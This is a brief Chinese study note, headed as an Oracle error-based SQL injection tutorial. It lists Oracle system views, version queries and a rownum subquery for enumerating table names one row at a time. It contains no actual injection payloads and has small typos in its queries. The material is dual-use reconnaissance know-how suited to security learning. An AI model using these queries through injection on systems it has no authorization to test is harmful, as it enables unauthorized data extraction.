SQL注入-Oracle报错注入

Oracle概述

1、Oracle数据库属于甲骨文公司，关系型数据库管理系统，数据库

2、讲究语法严谨
select 字段名 from 表名

3、dual表—>虚表 专门用于满足数据库语句结构的表
大部分数据库是数据敏感大小写，语句是不敏感大小写

4、Oracle系统自带表：
没有库的概念，只有用户的概念
查询出所有的表： select from all_tables
查询用户所创建的表：select from user_tables
查询所有的字段：select from all_tab_columns
查询出用户的字段：select from user_tab_columns
查版本：select * from v$version
order by 排序
user_tables 用于存放用户创建的表名等(表中字段名有 table_name)
user_tab_columns 用于存放用户创建的字段名等(表中的字段名有table_name,column_name)

5、页面往往只会返回一条数据
rownum字段 Oracle数据库会在表中自动加上rownum字段，起到统计作用

6、Oracle数据库不支持limit

7、a <> b ==> a不等于b

8、不能使用limit 但可以使用别名

子查询，将查询出来的数据rownnum 起个别名 ，子查询出来的数据可以是一张表
select * from (select rownum no,table_name from user_tab_columns) where no =1
select rownum no,table_name from user_tab_columns 将查询出来的table_name字段和no字段 作为新的一张表
